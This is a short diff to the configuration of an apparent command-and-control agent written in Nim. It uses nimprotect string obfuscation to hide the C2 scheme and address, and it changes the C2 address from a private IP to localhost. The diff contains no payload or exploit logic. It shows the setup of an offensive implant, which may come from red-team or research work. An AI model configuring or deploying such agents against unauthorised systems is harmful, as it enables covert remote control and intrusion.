@@ -4,7 +4,7 @@ import nimprotect
 ############################ CONFIG ############################
 # C2
 let c2_scheme* = protectString("http")
-let c2_address* = protectString("10.100.102.5")
+let c2_address* = protectString("localhost")
 let c2_port* = 80
 # Agent
 let is_exe* = true
